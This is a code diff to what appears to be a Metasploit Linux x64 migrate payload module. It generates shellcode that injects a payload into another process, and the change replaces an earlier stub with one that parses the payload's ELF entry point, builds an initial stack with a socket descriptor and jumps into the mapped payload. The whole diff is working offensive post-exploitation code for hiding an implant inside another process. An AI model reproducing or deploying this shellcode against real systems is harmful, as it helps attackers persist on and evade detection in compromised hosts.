@@ -1,5 +1,6 @@
 # -*- coding: binary -*-
 
+require 'rex/elfparsey'
 module Msf
 
 ###
@@ -22,10 +23,17 @@ module Payload::Linux::X64::Migrate
     ))
   end
 
+  def elf_ep(payload)
+    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
+    elf.elf_header.e_entry
+  end
   #
   # Constructs the migrate stub on the fly
   #
   def generate(opts={})
+    
+    entry_offset = elf_ep(opts[:payload])
+    
     asm = %^
       push rax
       push rcx
@@ -55,12 +63,14 @@ module Payload::Linux::X64::Migrate
       dec r8
       xor r9, r9
       syscall
+      
       push rax
       pop r9
       int 3
       push 0x39
       pop rax
       syscall
+      
       cmp rax, 0
       jz _exec_child
 _exec_parent:
@@ -81,33 +91,34 @@ _exec_parent:
       pop rax
       int 3
 _exec_child:
-      xor rsi, rsi
-      push rsi
-      lea rdi, [rsp]
-      inc rsi
-      mov rax, 0x13F
+      mov rax, 0x70
       syscall
-      mov rdi, rax
+      xchg rsi, r9
       push #{opts[:payload_length]}
       pop rdx
-      push r9
-      pop rsi
-      xor rax, rax
-      inc rax
-      syscall
+      and rsp, -0x10              ; Align
+      add sp, 80                  ; Add room for initial stack and prog name
+      mov rax, 109                ; prog name "m"
+      push rax                    ;
+      mov rcx, rsp                ; save the stack
+      xor rbx, rbx
+      push rbx                    ; NULL
+      push rbx                    ; AT_NULL
+      push rsi                    ; mmap'd address
+      mov rax, 7                  ; AT_BASE
+      push rax
+      push rbx                    ; end of ENV
+      push rbx                    ; NULL
+      push rdi                    ; ARGV[1] int sockfd
+      push rcx                    ; ARGV[0] char *prog_name
+      mov rax, 2                  ; ARGC
+      push rax
 
-      xor rdx, rdx
-      xor r10, r10
-      xor r8, r8
-      mov r8, 0x1000
-      push r10
-      lea rsi, [rsp]
-      mov eax, 0x142
-loop1:
-      nop
-      jmp loop1
-      syscall
-    ^
+      ; down the rabbit hole
+      mov rax, #{entry_offset}
+      add rsi, rax
+      jmp rsi
+^
 
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
